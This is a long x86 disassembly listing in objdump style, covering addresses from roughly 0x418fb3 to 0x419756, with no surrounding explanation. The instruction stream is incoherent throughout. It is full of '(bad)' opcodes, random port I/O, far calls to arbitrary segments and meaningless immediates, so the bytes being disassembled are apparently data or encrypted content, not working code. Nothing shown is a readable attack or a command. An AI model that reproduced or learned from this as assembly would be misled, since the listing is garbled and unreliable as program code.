  418fb3:	imul   ebp,DWORD PTR [edx+0x4b547e0b],0x7e
  418fba:	push   ds
  418fbb:	inc    esp
  418fbc:	xchg   ecx,eax
  418fbd:	test   DWORD PTR [ebx+0x38139510],edx
  418fc3:	test   ch,bl
  418fc5:	sar    DWORD PTR [edx+0x7e],1
  418fc8:	rcl    DWORD PTR [eax-0x5f],cl
  418fcb:	fsubr  QWORD PTR [eax]
  418fcd:	mov    ch,BYTE PTR [ecx]
  418fcf:	imul   ebx,DWORD PTR [ebp+0x69],0x97778502
  418fd6:	xor    ch,BYTE PTR [ebp+0x1c]
  418fd9:	xor    eax,0x4bf91aac
  418fde:	cmp    al,0x94
  418fe0:	xlat   BYTE PTR ds:[ebx]
  418fe1:	pop    eax
  418fe2:	inc    edx
  418fe3:	ins    DWORD PTR es:[edi],dx
  418fe4:	cmc    
  418fe5:	std    
  418fe6:	addr16 mov ds:0xd484,eax
  418fea:	adc    ecx,edi
  418fec:	push   eax
  418fed:	inc    edx
  418fee:	repz scas eax,DWORD PTR es:[edi]
  418ff0:	pop    esi
  418ff1:	and    al,0xe
  418ff3:	shl    BYTE PTR [ecx+ebp*4],1
  418ff6:	lods   al,BYTE PTR ds:[esi]
  418ff7:	add    eax,0xbfc75d34
  418ffc:	clc    
  418ffd:	cdq    
  418ffe:	stos   BYTE PTR es:[edi],al
  418fff:	and    esp,DWORD PTR [ebp-0x45e3150]
  419005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419006:	and    al,0xcb
  419008:	(bad)  
  419009:	and    bh,BYTE PTR [ebp-0x7bb70c09]
  41900f:	xchg   esi,eax
  419010:	mov    al,0xa7
  419012:	ja     0x419046
  419014:	stc    
  419015:	dec    edx
  419016:	and    ebx,ebx
  419018:	xchg   BYTE PTR [ebp+0x72],ch
  41901b:	sbb    BYTE PTR [edi+0x4378faa],ch
  419021:	lea    ebx,[edx]
  419023:	mov    ah,0xac
  419025:	and    eax,0x83fec931
  41902a:	cdq    
  41902b:	mov    ch,0xc8
  41902d:	les    ebx,FWORD PTR [edi+esi*1-0x41]
  419031:	cld    
  419032:	ret    0x6ee5
  419035:	push   eax
  419036:	(bad)  
  419037:	mov    WORD PTR [edx-0x6e28a71a],es
  41903d:	fs es sbb eax,0x6cefef2b
  419044:	add    ebp,0x3a
  419047:	stc    
  419048:	scas   al,BYTE PTR es:[edi]
  419049:	pop    ds
  41904a:	mov    ebp,0x2dc809cd
  41904f:	out    dx,al
  419050:	and    eax,DWORD PTR [ebx+0xf336d1a]
  419056:	mov    al,BYTE PTR [ebx*4-0x24570401]
  41905d:	div    cl
  41905f:	or     BYTE PTR [eax-0xd],al
  419062:	dec    ebp
  419063:	add    BYTE PTR [ebp+esi*8-0x4841bd6b],ch
  41906a:	outs   dx,DWORD PTR ds:[esi]
  41906b:	repnz mov esp,0x597e12bd
  419071:	mov    WORD PTR [edx],cs
  419073:	stos   BYTE PTR es:[edi],al
  419074:	mov    ds:0x5a3b9787,eax
  419079:	rcr    BYTE PTR [ecx+0x1843e004],cl
  41907f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419080:	pop    esp
  419081:	mov    edi,0xebcf4154
  419086:	xor    ah,0x9a
  419089:	call   0xcc024dc0
  41908e:	mov    WORD PTR [edx-0x1e],gs
  419091:	leave  
  419092:	out    dx,al
  419093:	adc    BYTE PTR [edx+0x71],dh
  419096:	inc    esi
  419097:	xlat   BYTE PTR ds:[ebx]
  419098:	inc    ecx
  419099:	cmp    al,0x3b
  41909b:	sbb    ah,ah
  41909d:	mov    DWORD PTR [esi],0xb76cdf55
  4190a3:	and    eax,0x106d9f2d
  4190a8:	jecxz  0x419035
  4190aa:	pop    ds
  4190ab:	aaa    
  4190ac:	jns    0x4190fe
  4190ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190af:	jns    0x41906d
  4190b1:	sbb    al,0x10
  4190b3:	cmc    
  4190b4:	mov    ds:0xb6c5e47c,eax
  4190b9:	and    eax,0xb0cf6990
  4190be:	and    al,0x62
  4190c0:	or     al,0xed
  4190c2:	mov    gs,WORD PTR gs:[ebp-0x98e8390]
  4190c9:	lahf   
  4190ca:	jno    0x4190db
  4190cc:	adc    eax,0xf7fc8ead
  4190d1:	and    al,BYTE PTR [ebp-0x4abd2c18]
  4190d7:	shr    DWORD PTR [ebx+0x73],1
  4190da:	rcl    BYTE PTR [edx],0xdb
  4190dd:	push   cs
  4190de:	and    ebp,DWORD PTR [esi+0x25a84514]
  4190e4:	xchg   ebp,eax
  4190e5:	cwde   
  4190e6:	xor    BYTE PTR [edx+0x5b],ah
  4190e9:	add    dl,BYTE PTR [ecx]
  4190eb:	inc    esi
  4190ec:	mov    al,0x6
  4190ee:	sub    bh,cl
  4190f0:	out    0x3c,eax
  4190f2:	idiv   DWORD PTR [ecx+esi*8-0x76]
  4190f6:	xchg   esi,eax
  4190f7:	xor    DWORD PTR [edx+0x6b],ebx
  4190fa:	xor    eax,0xdacb5c74
  4190ff:	cld    
  419100:	jnp    0x41912f
  419102:	mov    ecx,0x69e49ed2
  419107:	daa    
  419108:	test   BYTE PTR [esi-0x4dd0e39a],dh
  41910e:	cmp    BYTE PTR [ecx],dh
  419110:	push   es
  419111:	and    ebp,eax
  419113:	add    dh,BYTE PTR [ebx+0x2ab00bca]
  419119:	ret    
  41911a:	push   ebp
  41911b:	icebp  
  41911c:	pop    esp
  41911d:	(bad)  
  41911f:	pop    ebp
  419120:	ret    
  419121:	iret   
  419122:	or     al,0xba
  419124:	in     eax,0x2
  419126:	sub    eax,0x157e12c3
  41912b:	out    dx,al
  41912c:	ret    
  41912d:	neg    BYTE PTR [edx]
  41912f:	xlat   BYTE PTR ds:[ebx]
  419130:	push   ds
  419131:	sti    
  419132:	imul   edx,DWORD PTR [ecx],0x0
  419135:	in     al,dx
  419136:	test   BYTE PTR [ebp-0xe],dh
  419139:	imul   edx,DWORD PTR [ecx],0x57
  41913c:	out    dx,eax
  41913d:	mov    DWORD PTR [esi-0x5b81b52a],esi
  419143:	xchg   ebx,eax
  419144:	in     al,0x0
  419146:	xchg   esp,eax
  419147:	loop   0x41912e
  419149:	xor    ecx,edi
  41914b:	ret    
  41914c:	aas    
  41914d:	and    al,0xe5
  41914f:	dec    ecx
  419150:	fcomp  QWORD PTR [ebx]
  419152:	into   
  419153:	inc    ecx
  419154:	and    eax,0xa81f5b5
  419159:	gs jbe 0x41919b
  41915c:	mov    eax,0x3930c8fb
  419161:	dec    ebp
  419162:	push   ecx
  419163:	pop    edi
  419164:	cmp    al,0xe5
  419166:	xchg   ebx,eax
  419167:	rol    BYTE PTR [ebx],1
  419169:	mov    edx,0x78386e59
  41916e:	pop    eax
  41916f:	(bad)  
  419170:	lea    esp,[edi]
  419172:	xor    DWORD PTR [edi],0x8f4b132e
  419178:	add    DWORD PTR [esi+0x6a],edx
  41917b:	add    BYTE PTR [edi],bh
  41917d:	jmp    0x7ebaa81
  419182:	mov    dl,0x10
  419184:	pop    ds
  419185:	sahf   
  419186:	stos   DWORD PTR es:[edi],eax
  419187:	js     0x4191d5
  419189:	test   DWORD PTR [edx+eiz*8-0x37],esp
  41918d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41918e:	ret    
  41918f:	in     al,dx
  419190:	shl    DWORD PTR [eax-0x79],1
  419193:	dec    esp
  419194:	adc    eax,0x122bdd9a
  419199:	lea    ebp,[esi+0x68eaa366]
  41919f:	xchg   edi,eax
  4191a0:	ficom  WORD PTR [ecx+0x44207294]
  4191a6:	fnstenv [ebp-0x43bd458e]
  4191ac:	pop    ss
  4191ad:	mov    bl,0x1d
  4191af:	xor    ebx,ebx
  4191b1:	cmp    BYTE PTR [ecx-0x5a],dl
  4191b4:	stos   BYTE PTR es:[edi],al
  4191b5:	or     BYTE PTR [edi],0x3e
  4191b8:	pop    ebx
  4191b9:	xchg   esp,eax
  4191ba:	push   0x3a39e7bf
  4191bf:	iret   
  4191c0:	xchg   ebp,eax
  4191c1:	sub    eax,0xeb720615
  4191c6:	lods   eax,DWORD PTR ds:[esi]
  4191c7:	pop    ebx
  4191c8:	test   edx,ebx
  4191ca:	cmc    
  4191cb:	and    al,0x68
  4191cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191ce:	sahf   
  4191cf:	mov    bl,0x9a
  4191d1:	lods   al,BYTE PTR ds:[esi]
  4191d2:	adc    BYTE PTR [ebx+0x1a],0xda
  4191d6:	xchg   BYTE PTR [ebp+0x7e],cl
  4191d9:	js     0x41920f
  4191db:	aad    0xd
  4191dd:	pusha  
  4191de:	int3   
  4191df:	and    esp,DWORD PTR [ebx-0x69e28b48]
  4191e5:	xchg   edi,eax
  4191e6:	leave  
  4191e7:	(bad)  
  4191e9:	pusha  
  4191ea:	xor    al,cl
  4191ec:	test   al,0xc5
  4191ee:	mov    esi,0x986baa62
  4191f3:	dec    edx
  4191f4:	into   
  4191f5:	sub    edx,DWORD PTR [edi+edx*1]
  4191f8:	(bad)  
  4191f9:	scas   al,BYTE PTR es:[edi]
  4191fa:	mov    dl,0x66
  4191fc:	mov    ah,0xf2
  4191fe:	mov    esp,0x2db749ca
  419203:	cmp    DWORD PTR [ecx+0x7e],0xffffff86
  419207:	dec    eax
  419208:	mov    esp,0xc2e18293
  41920d:	or     esi,edx
  41920f:	jl     0x419241
  419211:	bound  eax,QWORD PTR [edi+ebx*8-0x63]
  419215:	push   0x94730451
  41921a:	jne    0x419289
  41921c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41921d:	and    esp,DWORD PTR [ebx]
  41921f:	adc    edi,edx
  419221:	es pop ss
  419223:	mov    bl,0x0
  419225:	stc    
  419226:	test   eax,0x2a119559
  41922b:	lock add DWORD PTR [esi],esp
  41922e:	inc    eax
  41922f:	scas   eax,DWORD PTR es:[edi]
  419230:	pop    es
  419231:	or     ebx,ecx
  419233:	xchg   esp,eax
  419234:	ret    0xd0c3
  419237:	js     0x41925c
  419239:	jle    0x41925e
  41923b:	aam    0xa9
  41923d:	mov    eax,ds:0x9a6c0fee
  419242:	inc    ecx
  419243:	out    0x47,al
  419245:	fucomp st(0)
  419247:	push   ebx
  419248:	stc    
  419249:	push   ebp
  41924a:	dec    ecx
  41924b:	mov    dh,0xec
  41924d:	jnp    0x4192aa
  41924f:	int3   
  419250:	mov    esi,0x5dabad5c
  419255:	sub    eax,0x50fffc58
  41925a:	(bad)  
  41925c:	sahf   
  41925d:	or     esp,ebx
  41925f:	adc    bl,BYTE PTR [edx]
  419261:	jae    0x419220
  419263:	xchg   ebx,eax
  419264:	cs inc esp
  419266:	jp     0x4191f3
  419268:	inc    ecx
  419269:	push   esi
  41926a:	xchg   esp,eax
  41926b:	js     0x419210
  41926d:	gs jno 0x41924b
  419270:	sub    al,0xa4
  419272:	jl     0x41921b
  419274:	and    bh,dl
  419276:	push   ecx
  419277:	adc    dl,BYTE PTR [ecx]
  419279:	xor    eax,0xda000809
  41927e:	sub    DWORD PTR ds:0x829e8f73,eax
  419284:	fwait
  419285:	push   ds
  419286:	outs   dx,DWORD PTR ds:[esi]
  419287:	xchg   ebp,eax
  419288:	add    al,0x14
  41928a:	adc    DWORD PTR [edx+0x7c],edx
  41928d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41928e:	call   0x2dfd1725
  419293:	jns    0x4192e2
  419295:	imul   esp,DWORD PTR [ecx],0x38
  419298:	leave  
  419299:	mov    ch,0x15
  41929b:	xor    eax,0x87814588
  4192a0:	fild   WORD PTR [edx]
  4192a2:	pop    ebp
  4192a3:	lods   eax,DWORD PTR ds:[esi]
  4192a4:	and    al,0xa9
  4192a6:	iret   
  4192a7:	and    bl,BYTE PTR [ebx+0xa]
  4192aa:	hlt    
  4192ab:	fistp  DWORD PTR [edx+0x36260d02]
  4192b1:	inc    edx
  4192b2:	jo     0x4192e1
  4192b4:	out    dx,eax
  4192b5:	mov    edi,0x976e08e0
  4192ba:	sbb    BYTE PTR [ebx+0x34],bl
  4192bd:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4192bf:	fcom   DWORD PTR [ebp+0x49]
  4192c2:	mov    al,0x8c
  4192c4:	and    DWORD PTR [esi+edx*2],ecx
  4192c7:	cmp    BYTE PTR [eax-0x56421d91],ch
  4192cd:	inc    ebp
  4192ce:	shl    DWORD PTR [eax+edi*1],0x8e
  4192d2:	mov    ebp,0x1efd2d19
  4192d7:	mov    ch,0xb3
  4192d9:	xor    DWORD PTR [esi-0x37],ecx
  4192dc:	jo     0x4192ca
  4192de:	retf   0xf3af
  4192e1:	and    eax,0x4cbee50
  4192e6:	xor    al,0xc7
  4192e8:	push   ebp
  4192e9:	adc    eax,0x2732fbb0
  4192ee:	(bad)  
  4192f0:	and    DWORD PTR [edx],0x32
  4192f3:	mov    esp,0x61be2227
  4192f8:	(bad)  
  4192f9:	std    
  4192fa:	mov    ebx,0x9a153df1
  4192ff:	cmp    BYTE PTR [ebx+0x6f],dl
  419302:	(bad)  
  419303:	sar    bl,1
  419305:	or     al,0x7d
  419307:	adc    BYTE PTR [ebp-0x3e06a9f3],bl
  41930d:	xchg   esi,eax
  41930e:	push   esp
  41930f:	test   DWORD PTR [ecx-0x19e7a07a],ebx
  419315:	call   0xded1:0x357961ae
  41931c:	fld    TBYTE PTR [edi]
  41931e:	mov    ecx,0xb3623f18
  419323:	xlat   BYTE PTR ds:[ebx]
  419324:	dec    ecx
  419325:	stos   DWORD PTR es:[edi],eax
  419326:	xor    eax,0xd170b7f8
  41932b:	je     0x419324
  41932d:	sbb    cl,dh
  41932f:	lods   al,BYTE PTR ds:[esi]
  419330:	cmp    dh,bh
  419332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419333:	scas   eax,DWORD PTR es:[edi]
  419334:	pop    edi
  419335:	sti    
  419336:	outs   dx,BYTE PTR ds:[esi]
  419337:	cwde   
  419338:	fistp  WORD PTR [ebp-0x32]
  41933b:	(bad)  
  41933c:	and    ah,BYTE PTR [eax+0x2d]
  41933f:	in     al,dx
  419340:	retf   0x4ed0
  419343:	push   esi
  419344:	adc    DWORD PTR [edi+0x40],0x5
  419348:	int    0xfa
  41934a:	lods   eax,DWORD PTR ds:[esi]
  41934b:	ror    BYTE PTR [ecx+esi*8-0x41],0xfe
  419350:	mov    ebp,0xa73f01f
  419355:	fwait
  419356:	rcl    DWORD PTR ds:0x6af905ce,0x45
  41935d:	adc    ecx,eax
  41935f:	adc    DWORD PTR ds:0xe1c5b9b,0xbc6bd698
  419369:	daa    
  41936a:	outs   dx,BYTE PTR ds:[esi]
  41936c:	inc    esp
  41936d:	xor    al,0xd4
  41936f:	in     al,dx
  419370:	xchg   esp,eax
  419371:	jecxz  0x41938a
  419373:	sub    ebp,DWORD PTR [ecx]
  419375:	cmc    
  419376:	mov    cl,0x33
  419378:	jp     0x4193d3
  41937a:	or     dl,BYTE PTR [ebx+0x7c722d4b]
  419380:	fwait
  419381:	jmp    0x96e1:0x312d1fd1
  419388:	rcr    bl,cl
  41938a:	push   es
  41938b:	repz fisubr DWORD PTR [edi+0x512d1175]
  419392:	fwait
  419393:	call   0xafbf:0xb7967e82
  41939a:	pushf  
  41939b:	jno    0x419345
  41939d:	mov    ch,0xb5
  41939f:	jno    0x4193ec
  4193a1:	xchg   edi,eax
  4193a2:	ins    BYTE PTR es:[edi],dx
  4193a3:	jle    0x41933e
  4193a5:	mov    cl,0x86
  4193a7:	loope  0x419423
  4193a9:	fbstp  TBYTE PTR [eax-0x16f8645a]
  4193af:	add    cl,bh
  4193b1:	xor    ah,BYTE PTR [ebp-0x3f]
  4193b4:	ds sub al,0x8
  4193b7:	leave  
  4193b8:	add    dh,dh
  4193ba:	imul   ecx,DWORD PTR [eax-0x12a17880],0x884d45f5
  4193c4:	xchg   ecx,eax
  4193c5:	or     DWORD PTR [edx+0x1f197f46],0x1db96cd0
  4193cf:	or     al,0x74
  4193d1:	das    
  4193d2:	loop   0x41942c
  4193d4:	(bad)  
  4193d5:	mov    dl,0x29
  4193d7:	add    al,BYTE PTR [edi]
  4193d9:	add    bh,ah
  4193db:	xchg   ebx,eax
  4193dc:	cmp    edx,DWORD PTR [ebx]
  4193de:	adc    edx,esp
  4193e0:	data16 fdiv QWORD PTR [ebx]
  4193e3:	addr16 inc eax
  4193e5:	jbe    0x419385
  4193e7:	ins    DWORD PTR es:[edi],dx
  4193e8:	push   edi
  4193e9:	lahf   
  4193ea:	retf   0xe2a6
  4193ed:	jb     0x41944e
  4193ef:	ins    DWORD PTR es:[edi],dx
  4193f0:	lock sbb BYTE PTR [ecx],al
  4193f3:	shr    BYTE PTR [esi],0xfe
  4193f6:	rcr    BYTE PTR [ecx+0x60],1
  4193f9:	adc    eax,0xeeb74185
  4193fe:	sahf   
  4193ff:	loope  0x41944a
  419401:	lock dec ebp
  419403:	addr16 jge 0x419451
  419406:	fisub  WORD PTR [edx+0x36]
  419409:	or     esp,DWORD PTR ds:0xd6fbb41c
  41940f:	jnp    0x419488
  419411:	in     eax,dx
  419412:	cmp    ebp,DWORD PTR es:[ebp-0x24343ac7]
  419419:	mov    dl,0x17
  41941b:	xor    dl,ch
  41941d:	mov    bl,0xc9
  41941f:	pushf  
  419420:	jo     0x4193eb
  419422:	mov    bh,0x53
  419424:	cdq    
  419425:	aas    
  419426:	aad    0xe
  419428:	test   BYTE PTR [ecx+0x2cf43cf7],ah
  41942e:	push   es
  41942f:	aad    0x79
  419431:	lahf   
  419432:	mov    bl,0xc1
  419434:	scas   eax,DWORD PTR es:[edi]
  419435:	inc    ebp
  419436:	add    eax,0x1734b126
  41943b:	repz sub BYTE PTR [edi-0x69],bh
  41943f:	ret    0x4880
  419442:	lods   al,BYTE PTR ds:[esi]
  419443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419444:	push   edi
  419445:	(bad)  
  419447:	outs   dx,BYTE PTR ds:[esi]
  419448:	rcr    bh,1
  41944a:	shl    bh,1
  41944c:	adc    eax,0xa0204600
  419451:	iret   
  419452:	adc    eax,0x2d887f4e
  419457:	cmp    cl,0xf5
  41945a:	xchg   esp,eax
  41945b:	cdq    
  41945c:	les    edi,FWORD PTR [edx+0x7e]
  41945f:	pop    ss
  419460:	outs   dx,DWORD PTR ds:[esi]
  419461:	fwait
  419462:	and    eax,0x7f5bf73a
  419467:	ret    0x7564
  41946a:	in     al,dx
  41946b:	outs   dx,DWORD PTR ds:[esi]
  41946c:	outs   dx,BYTE PTR ds:[esi]
  41946d:	retf   0xdd57
  419470:	retf   0xb9c4
  419473:	mov    edx,0xe1b367f
  419478:	dec    edi
  419479:	push   esi
  41947a:	dec    esp
  41947b:	jae    0x419405
  41947d:	sub    eax,0x7a0127e7
  419482:	dec    esp
  419483:	scas   al,BYTE PTR es:[edi]
  419484:	test   DWORD PTR [edi],esp
  419486:	sub    esi,DWORD PTR [ecx]
  419488:	stos   DWORD PTR es:[edi],eax
  419489:	test   dh,dl
  41948b:	jb     0x41942c
  41948d:	jge    0x419490
  41948f:	pop    ebp
  419490:	jmp    0x4194dc
  419492:	xchg   DWORD PTR [edx+0x73e15f50],esi
  419498:	mov    edx,0x4e6e3e7f
  41949d:	or     cl,cl
  41949f:	enter  0xf05d,0xcb
  4194a3:	mov    edi,0xf88f68a4
  4194a8:	push   ebx
  4194a9:	lods   eax,DWORD PTR ds:[esi]
  4194aa:	out    0xf5,al
  4194ac:	popf   
  4194ad:	leave  
  4194ae:	iret   
  4194af:	push   ecx
  4194b0:	push   esi
  4194b1:	mov    ecx,0x6ef287a0
  4194b6:	(bad)  
  4194b7:	mov    eax,ds:0xb52297e4
  4194bc:	fcmovne st,st(2)
  4194be:	ins    BYTE PTR es:[edi],dx
  4194bf:	mov    edx,0xd36934d9
  4194c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194c5:	inc    eax
  4194c6:	dec    ebp
  4194c7:	stos   BYTE PTR es:[edi],al
  4194c8:	(bad)  
  4194ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194cb:	cwde   
  4194cc:	aaa    
  4194cd:	mov    ds:0xee85ded,eax
  4194d2:	lahf   
  4194d3:	xor    eax,0x55fb8567
  4194d8:	call   0xfd66:0xa0ae16e5
  4194df:	retf   0x8eea
  4194e2:	fsub   DWORD PTR [esi+0xa]
  4194e5:	push   0xcf3d06c8
  4194ea:	gs jb  0x41950d
  4194ed:	or     al,0x64
  4194ef:	jecxz  0x4194bc
  4194f1:	sbb    DWORD PTR [ebx-0x1818a899],edi
  4194f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194f8:	and    al,0x19
  4194fa:	sbb    al,BYTE PTR [ecx]
  4194fc:	cmp    eax,0xa8fc251c
  419501:	cmp    DWORD PTR [eax-0x11],ecx
  419504:	dec    ebx
  419505:	xchg   esp,eax
  419506:	sti    
  419507:	pop    ecx
  419508:	pop    es
  419509:	jne    0x419514
  41950b:	cmp    cl,dh
  41950d:	pop    es
  41950e:	dec    ecx
  41950f:	sub    al,0xa5
  419511:	push   edi
  419512:	(bad)  
  419513:	push   eax
  419514:	in     eax,0xb7
  419516:	mov    ah,0x44
  419518:	xchg   DWORD PTR [esp+ebp*1+0x1c56c81b],ebp
  41951f:	xor    esi,DWORD PTR [esi]
  419521:	or     al,cl
  419523:	or     edx,DWORD PTR [ebp+0xb]
  419526:	mov    WORD PTR [eax+0x370e630d],cs
  41952c:	test   eax,0xda0f739c
  419531:	sub    dl,bh
  419533:	mov    eax,gs:0x741664ea
  419539:	lea    esp,[edx]
  41953b:	out    dx,al
  41953c:	loop   0x41956a
  41953e:	test   DWORD PTR [ebx+0x46de51a3],edx
  419544:	scas   eax,DWORD PTR es:[edi]
  419545:	mov    DWORD PTR [eax+0x4b564803],edi
  41954b:	mov    ch,0x22
  41954d:	pop    edx
  41954e:	jecxz  0x41957f
  419550:	pop    esp
  419551:	mov    cl,0x3b
  419553:	add    BYTE PTR [ecx-0x45422979],0x5e
  41955a:	and    ebp,DWORD PTR [edx]
  41955c:	mov    ch,0x73
  41955e:	retf   0x25e0
  419561:	out    dx,al
  419562:	enter  0xda83,0x9f
  419566:	push   eax
  419567:	jb     0x419503
  419569:	ss pop es
  41956b:	xchg   ebp,eax
  41956c:	or     eax,DWORD PTR [esi+0x4f]
  41956f:	or     eax,0xbc3346a7
  419574:	int    0xe
  419576:	ss jns 0x41950e
  419579:	lock push ebx
  41957b:	and    ecx,DWORD PTR [ebp+eiz*4+0x6]
  41957f:	dec    BYTE PTR [edi+0x448b1e76]
  419585:	xor    DWORD PTR ds:0xa994596e,ecx
  41958b:	mov    ecx,ecx
  41958d:	push   0x4ca8314d
  419592:	sub    al,0xb1
  419594:	xchg   esp,eax
  419595:	call   0x2fee:0x43c6f5dd
  41959c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41959d:	mov    ecx,0x2fa1de9
  4195a2:	adc    edi,DWORD PTR [edx]
  4195a4:	outs   dx,BYTE PTR ds:[esi]
  4195a5:	inc    ecx
  4195a6:	inc    esi
  4195a7:	pop    eax
  4195a8:	mov    ecx,0xe9521fa8
  4195ad:	nop
  4195ae:	dec    ebx
  4195af:	sbb    DWORD PTR [esi+0x26],ebp
  4195b2:	scas   al,BYTE PTR es:[edi]
  4195b3:	mov    ch,0x79
  4195b5:	push   ebx
  4195b6:	stc    
  4195b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195b8:	in     eax,0xba
  4195ba:	aad    0x7
  4195bc:	fisub  WORD PTR [eax+0x7f]
  4195bf:	jmp    0xe79a:0x510f286
  4195c6:	arpl   WORD PTR [ebx],dx
  4195c8:	mov    ecx,0x30c7f57d
  4195cd:	push   edx
  4195ce:	push   ecx
  4195cf:	mov    esp,0x40f3c2d9
  4195d4:	into   
  4195d5:	arpl   WORD PTR [esi-0x2fafdb05],cx
  4195db:	(bad)  
  4195dc:	sbb    BYTE PTR [bp+si+0x25b7],0x77
  4195e2:	mov    ecx,0x9cdc481d
  4195e7:	mov    ch,0xdf
  4195e9:	outs   dx,BYTE PTR ds:[esi]
  4195ea:	or     eax,0x6435c703
  4195ef:	xor    dl,dh
  4195f1:	call   0x672944a0
  4195f6:	(bad)  
  4195f7:	outs   dx,BYTE PTR ds:[esi]
  4195f8:	inc    edx
  4195f9:	mov    dx,0xd1b8
  4195fd:	jbe    0x419635
  4195ff:	lock mov esi,0x81df9de7
  419605:	jb     0x419684
  419607:	jae    0x419616
  419609:	aas    
  41960a:	sub    ebx,eax
  41960c:	add    eax,0x2ad573ad
  419611:	cmp    bl,BYTE PTR [eax]
  419613:	pusha  
  419614:	pop    edx
  419615:	xor    bl,BYTE PTR [esp+edi*4]
  419618:	adc    al,0x78
  41961a:	popa   
  41961b:	pop    ds
  41961c:	push   es
  41961d:	sahf   
  41961e:	dec    ebx
  41961f:	push   ss
  419620:	xor    DWORD PTR [esi+eax*1+0xf],edi
  419624:	pop    esp
  419625:	arpl   WORD PTR [ebx-0x30],dx
  419628:	xlat   BYTE PTR ds:[ebx]
  419629:	bound  esi,QWORD PTR [ecx-0x45]
  41962c:	sub    edi,ebx
  41962e:	inc    edi
  41962f:	in     eax,0x34
  419631:	aam    0xbb
  419633:	xor    DWORD PTR [edi+0xc],edx
  419636:	daa    
  419637:	mov    WORD PTR [edx-0x13be1e54],gs
  41963d:	retfw  0x20d5
  419641:	push   0xffffff93
  419643:	sbb    ebp,ecx
  419645:	mov    dl,bh
  419647:	mov    bl,0xd8
  419649:	pop    esi
  41964a:	jmp    0x41967d
  41964c:	ins    DWORD PTR es:[edi],dx
  41964d:	pusha  
  41964e:	daa    
  41964f:	adc    BYTE PTR [esi],ch
  419651:	jnp    0x4196c7
  419653:	repnz sahf 
  419655:	add    BYTE PTR [ebp+0x50],cl
  419658:	jb     0x4196d5
  41965a:	fldenv ds:0xa921b8fd
  419660:	xor    eax,0xe6d2fa36
  419665:	cmp    DWORD PTR [eax],eax
  419667:	mov    dh,0xf3
  419669:	sub    BYTE PTR [ecx+0x5a5f2717],dh
  41966f:	jnp    0x4196c0
  419671:	jp     0x4196b7
  419673:	lds    edi,FWORD PTR [edx-0x20]
  419676:	dec    eax
  419677:	lahf   
  419678:	retf   
  419679:	xchg   DWORD PTR [ecx+edx*4-0x13d04c12],esp
  419680:	add    DWORD PTR [edx-0x51d88324],0xfffffff2
  419687:	pop    ebx
  419688:	test   DWORD PTR [eax+0x46],esi
  41968b:	nop
  41968c:	mov    ebx,0x7e585d91
  419691:	cmp    eax,0x4ca0a6d8
  419696:	and    bh,al
  419698:	mov    WORD PTR [esi],?
  41969a:	outs   dx,DWORD PTR ds:[esi]
  41969b:	mov    dl,0xb3
  41969d:	test   BYTE PTR [ebx-0x43],cl
  4196a0:	popa   
  4196a1:	out    dx,al
  4196a2:	or     al,0xbf
  4196a4:	add    eax,DWORD PTR [edx-0x37ae8193]
  4196aa:	hlt    
  4196ab:	dec    esi
  4196ac:	inc    edi
  4196ad:	cmc    
  4196ae:	mov    ecx,0xb3975338
  4196b3:	xor    al,0x51
  4196b5:	loop   0x41964d
  4196b7:	adc    BYTE PTR [esi+0x31e376af],dh
  4196bd:	pop    esi
  4196be:	not    al
  4196c0:	mov    bl,0x56
  4196c2:	mov    bl,0x30
  4196c4:	adc    al,0xbe
  4196c6:	adc    ecx,ebp
  4196c8:	mov    bh,0xcb
  4196ca:	std    
  4196cb:	leave  
  4196cc:	sub    dl,bh
  4196ce:	pusha  
  4196cf:	dec    ecx
  4196d0:	jecxz  0x41967b
  4196d2:	adc    DWORD PTR [edi+eax*8+0xf70d890],ecx
  4196d9:	rcl    BYTE PTR [ebp-0x3997f56d],1
  4196df:	(bad)  
  4196e0:	pushw  es
  4196e2:	and    dl,BYTE PTR [ecx]
  4196e4:	(bad)  
  4196e5:	jbe    0x41975c
  4196e7:	loope  0x4196e0
  4196e9:	ins    DWORD PTR es:[edi],dx
  4196ea:	frstor [edx]
  4196ec:	jg     0x41969c
  4196ee:	dec    ebp
  4196ef:	xchg   ah,cl
  4196f1:	sti    
  4196f2:	rcl    BYTE PTR [ebp+0x23749e59],cl
  4196f8:	das    
  4196f9:	shr    DWORD PTR [eax+0x5c],0xf2
  4196fd:	jg     0x419735
  4196ff:	aad    0x1b
  419701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419702:	pop    esp
  419703:	(bad)  
  419705:	mov    dl,0xf0
  419707:	lahf   
  419708:	mov    dh,0xd8
  41970a:	dec    eax
  41970b:	push   0x321e12cb
  419710:	xchg   esi,eax
  419711:	dec    edx
  419712:	and    edx,DWORD PTR [edx]
  419714:	cld    
  419715:	xor    ebx,0xffffffb4
  419718:	shl    BYTE PTR [ecx+0x717c8e3f],0x22
  41971f:	outs   dx,BYTE PTR ds:[esi]
  419720:	(bad)  
  419721:	push   ss
  419722:	pushf  
  419723:	mov    bl,0x47
  419725:	push   0x134b2904
  41972a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41972b:	into   
  41972c:	or     esi,DWORD PTR [ebx-0x7b]
  41972f:	js     0x41977c
  419731:	sahf   
  419732:	add    DWORD PTR [eax+ebx*8-0x353836d5],edx
  419739:	fdiv   QWORD PTR [eax+eax*2-0x12e5fb30]
  419740:	push   ebx
  419741:	jmp    DWORD PTR [esi]
  419743:	xor    bl,BYTE PTR [eax-0xc05f06c]
  419749:	mul    DWORD PTR [ecx+0x43]
  41974c:	inc    edx
  41974d:	jl     0x419755
  41974f:	inc    esi
  419750:	(bad)  [ecx+0x40]
  419753:	ds jmp 0x41978d
  419756:	jae    0x4197a4
